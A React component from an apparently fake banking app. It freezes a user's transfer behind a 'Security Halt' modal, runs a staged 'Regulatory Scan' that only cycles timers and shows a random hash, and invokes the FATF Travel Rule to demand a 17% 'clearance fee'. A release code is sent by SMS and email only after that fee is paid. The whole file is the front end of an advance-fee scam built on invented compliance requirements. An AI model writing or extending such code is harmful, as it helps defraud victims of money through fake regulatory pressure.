
import React, { useState, useEffect } from 'react';
import { 
    SpinnerIcon, 
    ShieldCheckIcon, 
    ScaleIcon, 
    XIcon, 
    CheckCircleIcon,
    GlobeAmericasIcon,
    ExclamationTriangleIcon,
    LockClosedIcon
} from './Icons';
import { SmartWalletPayment } from './SmartWalletPayment';
import { sendItccCodeViaTwilio } from '../utils/notificationService';
import { sendEmail, generateBankingEmailTemplate } from '../services/emailService';
import { USER_PROFILE } from './constants';

interface ComplianceHaltModalProps {
    isOpen: boolean;
    amount: number;
    onVerified: () => void;
    onCancel: () => void;
    onContactSupport?: () => void;
    isCrypto?: boolean; 
}

const CryptoScanner = () => (
    <div className="p-10 text-center space-y-8 animate-fade-in">
         <div className="relative w-32 h-32 mx-auto">
             <div className="absolute inset-0 border-4 border-slate-200 dark:border-slate-700 rounded-full opacity-30"></div>
             <div className="absolute inset-0 border-4 border-t-primary border-r-primary border-b-transparent border-l-transparent rounded-full animate-spin"></div>
             <div className="absolute inset-4 bg-slate-50 dark:bg-slate-900 rounded-full flex items-center justify-center border border-slate-200 dark:border-white/10 shadow-inner">
                 <GlobeAmericasIcon className="w-12 h-12 text-[#0F172A] dark:text-white animate-pulse" />
             </div>
         </div>
         <div>
             <h3 className="text-2xl font-black text-[#0F172A] dark:text-white uppercase tracking-tight">Regulatory Scan</h3>
             <p className="text-[#0F172A] dark:text-white text-xs font-bold uppercase tracking-widest mt-2">FATF Travel Rule Protocol</p>
         </div>
         <p className="text-[10px] text-[#0F172A] font-mono">NODE_HASH: 0x{Math.random().toString(16).substr(2, 20).toUpperCase()}...</p>
    </div>
);

export const ComplianceHaltModal: React.FC<ComplianceHaltModalProps> = ({ isOpen, amount, onVerified, onCancel, isCrypto = false }) => {
    const [code, setCode] = useState('');
    const [error, setError] = useState('');
    const [view, setView] = useState<'input' | 'smart_wallet' | 'crypto_scan'>('input');
    const [scanStep, setScanStep] = useState(0); 
    const [isChecking, setIsChecking] = useState(false);
    const [resendStatus, setResendStatus] = useState('idle');
    const [validCode, setValidCode] = useState<string | null>(null); // Stores the dynamic random code

    const activeProfile = React.useMemo(() => {
        try {
            const stored = sessionStorage.getItem('active_user_profile');
            if (stored) {
                const parsed = JSON.parse(stored);
                if (parsed && typeof parsed === 'object' && parsed.email) {
                    return parsed;
                }
            }
        } catch (e) {
            console.warn("Failed to parse active user profile from storage", e);
        }
        return USER_PROFILE;
    }, [isOpen]);

    const clearanceFee = amount * 0.17;

    useEffect(() => {
        if (isCrypto && view === 'input') {
            setView('crypto_scan');
            runCryptoChecks();
        }
    }, [isCrypto, view]);

    const runCryptoChecks = () => {
        const stepTime = 1500;
        setScanStep(1);
        setTimeout(() => setScanStep(2), stepTime);
        setTimeout(() => setScanStep(3), stepTime * 2);
        setTimeout(() => {
            setView('input'); 
        }, stepTime * 3);
    };

    if (!isOpen) return null;

    const handleVerify = () => {
        setError('');
        setIsChecking(true);
        setTimeout(() => {
            // Strict check: User MUST have paid to get the code.
            // If validCode is null, they haven't paid yet.
            if (!validCode) {
                setError('Authorization required. Please resolve compliance fee to generate code.');
                setIsChecking(false);
                return;
            }

            if (code.toUpperCase() === validCode) {
                onVerified();
            } else {
                setError('Invalid clearance code. Please check your SMS/Email.');
                setIsChecking(false);
            }
        }, 2000);
    };

    // Callback when payment finishes in the sub-component
    const handlePaymentComplete = (generatedCode: string) => {
        setValidCode(generatedCode);
        setView('input');
        // Do NOT auto-fill. User must read the SMS.
    };

    const handleResendCode = async () => {
        if (!validCode) {
            setError('Code generation pending payment.');
            return;
        }

        setResendStatus('sending');
        
        // Resend the EXISTING valid random code via SMS
        await sendItccCodeViaTwilio(activeProfile.phone || '3159150854', validCode);
        
        // Also resend via Email
        const emailSubject = "Security Alert: Clearance Code Resent";
        const emailBody = generateBankingEmailTemplate(
            "Clearance Code Resent",
            `A request to resend your clearance code was initiated.<br/><br/>
             Your Secure Clearance Code is:<br/>
              <h1 style="font-size: 32px; letter-spacing: 4px; color: #0ec5f2;">${validCode}</h1>
             <br/>If you did not request this, please contact support immediately.`,
             "Login to Dashboard"
        );
        await sendEmail(activeProfile.email, emailSubject, emailBody);
        
        console.log(`[RESEND] Code ${validCode} sent to ${activeProfile.email} and ${activeProfile.phone}`);

        setTimeout(() => setResendStatus('sent'), 1000);
        setTimeout(() => setResendStatus('idle'), 4000);
    };

    return (
        <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
            <div 
                className="absolute inset-0 bg-slate-50 dark:bg-[#030712]/95  animate-fade-in bg-cover bg-center bg-no-repeat"
                style={{ backgroundImage: `url('/src/assets/images/premium_banking_vault_blur_1781949708674.jpg')`, opacity: 0.15 }}
            ></div>
            <div className="absolute inset-0 bg-gradient-to-t from-slate-100 via-slate-100/90 dark:from-[#030712] dark:via-[#030712]/90 to-transparent pointer-events-none"></div>
            
            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                <div className="w-[40rem] h-[40rem] bg-red-600 rounded-full blur-[100px] animate-pulse"></div>
            </div>

            {view === 'smart_wallet' ? (
                <div className="w-full max-w-lg z-10 animate-fade-in-up">
                    <SmartWalletPayment 
                        amount={clearanceFee}
                        onPaymentConfirmed={handlePaymentComplete}
                        onBack={() => setView('input')}
                        userProfile={activeProfile}
                    />
                </div>
            ) : (
                <div className="w-full max-w-lg bg-white dark:bg-slate-800  border border-red-500/20 rounded-[2rem] shadow-[0_0_80px_rgba(220,38,38,0.1)] overflow-hidden relative z-10 animate-fade-in-up">
                    
                    {view === 'crypto_scan' ? <CryptoScanner /> : view === 'input' ? (
                        <>
                        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-red-500 to-transparent opacity-75"></div>
                        
                        <div className="p-10 text-center">
                            <div className="w-24 h-24 bg-red-950 rounded-full flex items-center justify-center mx-auto mb-8 border border-red-500/30 shadow-[0_0_40px_rgba(220,38,38,0.2)] relative">
                                <div className="absolute inset-0 rounded-full border border-red-500/30 animate-[spin_4s_linear_infinite]"></div>
                                <div className="absolute inset-2 rounded-full border border-red-500/20 animate-[spin_3s_linear_infinite_reverse]"></div>
                                <ScaleIcon className="w-10 h-10 text-red-500 relative z-10 drop-shadow-[0_0_10px_rgba(220,38,38,0.8)]" />
                            </div>
                            
                            <h2 className="text-4xl font-black text-[#0F172A] dark:text-white uppercase tracking-tighter leading-none mb-2">Security Halt</h2>
                            <p className="text-red-500 font-bold text-[11px] uppercase tracking-[0.3em]">
                                {isCrypto ? 'Crypto Asset Compliance Form' : 'Compliance Review Active'}
                            </p>
                            
                            <div className="mt-10 text-left bg-gradient-to-b from-red-950/40 to-black/40 border border-red-900/30 p-6 rounded-2xl relative overflow-hidden">
                                <div className="absolute top-0 left-0 w-1 h-full bg-red-500"></div>
                                <p className="text-[#0F172A] dark:text-white text-sm leading-relaxed mb-4 font-bold">
                                    Transaction flagged for additional verification. An ITCC Compliance Code is required to release the network hold.
                                </p>
                                <p className="text-[10px] text-[#0F172A] leading-relaxed uppercase tracking-wider font-bold">
                                    Mandatory clearance fees apply. Code is generated <strong className="text-red-400 drop-shadow-[0_0_5px_rgba(248,113,113,0.5)]">automatically</strong> upon fee settlement.
                                </p>
                            </div>

                            <div className="mt-8">
                                <label className="block text-left text-[10px] font-black text-[#0F172A] dark:text-white uppercase tracking-widest mb-3 ml-2 flex items-center gap-2">
                                    <LockClosedIcon className="w-3 h-3" /> Input Compliance Code
                                </label>
                                <div className="relative group">
                                    <div className="absolute -inset-0.5 bg-gradient-to-r from-red-500/0 via-red-500/30 to-red-500/0 rounded-2xl blur opacity-0 group-focus-within:opacity-100 transition duration-500"></div>
                                    <input 
                                        type="text" 
                                        value={code}
                                        onChange={(e) => setCode(e.target.value.toUpperCase())}
                                        className="relative w-full bg-slate-100 border border-slate-200 dark:border-slate-300/50 text-[#0F172A] dark:text-white p-5 rounded-2xl text-center tracking-[0.5em] font-mono text-xl focus:border-red-500 outline-none  transition-all"
                                        placeholder="XXX-XXX"
                                        autoFocus
                                    />
                                    {resendStatus !== 'idle' && (
                                        <div className="absolute right-4 top-1/2 -translate-y-1/2">
                                            {resendStatus === 'sending' ? <SpinnerIcon className="w-4 h-4 text-[#0F172A] dark:text-white animate-spin"/> : <CheckCircleIcon className="w-5 h-5 text-emerald-500 drop-shadow-[0_0_8px_rgba(16,185,129,0.5)]"/>}
                                        </div>
                                    )}
                                </div>
                                {error && (
                                    <div className="mt-4 flex items-center justify-center gap-2 text-red-400 bg-red-950 py-2 px-3 rounded-lg border border-red-900/50">
                                        <ExclamationTriangleIcon className="w-4 h-4 shrink-0" />
                                        <p className="text-[10px] font-bold uppercase tracking-wider">{error}</p>
                                    </div>
                                )}
                                
                                {validCode ? (
                                    <div className="mt-5 text-center bg-emerald-950 border border-emerald-900/30 p-3 rounded-xl border-dashed">
                                        <p className="text-[10px] text-emerald-400 font-black uppercase tracking-widest mb-2">
                                            Code issued to {activeProfile.email} & {activeProfile.phone?.slice(-4)}
                                        </p>
                                        <button 
                                            onClick={handleResendCode}
                                            className="text-[9px] font-bold text-[#0F172A] hover:text-[#0F172A] dark:text-white uppercase tracking-widest transition-colors py-1 px-3 bg-white hover:bg-white rounded-full dark:bg-slate-800"
                                        >
                                            {resendStatus === 'sent' ? 'Code Sent' : 'Resend Code'}
                                        </button>
                                    </div>
                                ) : (
                                    <div className="mt-5 flex items-center justify-center gap-2 text-[10px] font-bold text-[#0F172A] uppercase tracking-widest border border-slate-100 dark:border-white/10 py-2 rounded-xl">
                                        <div className="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></div> Code generation pending payment
                                    </div>
                                )}
                            </div>

                            <button 
                                onClick={handleVerify}
                                disabled={isChecking || code.length < 5}
                                className="w-full mt-8 py-5 bg-gradient-to-r from-red-600 to-red-500 hover:from-red-500 hover:to-red-400 text-[#0F172A] dark:text-white font-black uppercase tracking-widest text-[11px] rounded-xl shadow-[0_0_30px_rgba(220,38,38,0.3)] hover:shadow-[0_0_40px_rgba(220,38,38,0.5)] flex items-center justify-center gap-3 transition-all disabled:opacity-30 transform active:scale-[0.98]"
                            >
                                {isChecking ? <SpinnerIcon className="w-5 h-5 text-[#0F172A] dark:text-white animate-spin"/> : <ShieldCheckIcon className="w-5 h-5"/>}
                                {isChecking ? 'Verifying Node Auth...' : 'Verify & Release'}
                            </button>

                            {!validCode && (
                                <div className="mt-8 flex flex-col items-center">
                                    <button 
                                        onClick={() => setView('smart_wallet')}
                                        className="group relative flex items-center justify-between w-full p-4 rounded-xl border border-red-500/30 bg-red-500 hover:bg-red-500 transition-all overflow-hidden"
                                    >
                                        <div className="absolute inset-0 w-1/2 h-full bg-gradient-to-r from-transparent via-white/5 to-transparent -translate-x-[100%] group-hover:translate-x-[200%] transition-transform duration-1000 ease-in-out"></div>
                                        <div className="flex flex-col items-start gap-1">
                                            <span className="text-[10px] font-black text-red-500 uppercase tracking-widest">Required Action</span>
                                            <span className="text-xs font-bold text-[#0F172A] dark:text-white">Proceed to Secure Gateway</span>
                                        </div>
                                        <div className="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center text-red-400 group-hover:bg-red-500 group-hover:text-[#0F172A] dark:text-white transition-colors">
                                            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            )}
                        </div>
                            <button onClick={onCancel} className="absolute top-6 right-6 p-2 rounded-full bg-white text-[#0F172A] dark:text-white hover:text-[#0F172A] dark:text-white hover:bg-white transition-colors  dark:bg-slate-800">
                                <XIcon className="w-5 h-5" />
                            </button>
                        </>
                    ) : null}
                </div>
            )}
        </div>
    );
};
